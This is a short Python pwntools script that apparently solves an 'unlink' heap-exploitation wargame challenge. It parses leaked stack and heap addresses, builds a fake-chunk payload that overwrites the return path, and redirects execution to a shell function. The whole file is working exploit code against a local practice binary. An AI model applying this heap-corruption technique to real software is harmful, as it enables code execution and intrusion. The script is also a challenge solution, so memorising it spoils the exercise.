from pwn import *

shell = 0x080484eb
sh = process("./unlink")
stack_leak = int(sh.recvline().split("0x")[1].split("\n")[0], 16)
heap_leak  = int(sh.recvline().split("0x")[1].split("\n")[0], 16)

main_ret   = stack_leak + 16
fake_chunk = heap_leak  + 32

sh.recv()
payload  = "A" * 12
payload += p32(0x19)
payload += p32(fake_chunk + 4)
payload += p32(main_ret)
payload += p32(shell)

sh.sendline(payload)
sh.interactive()

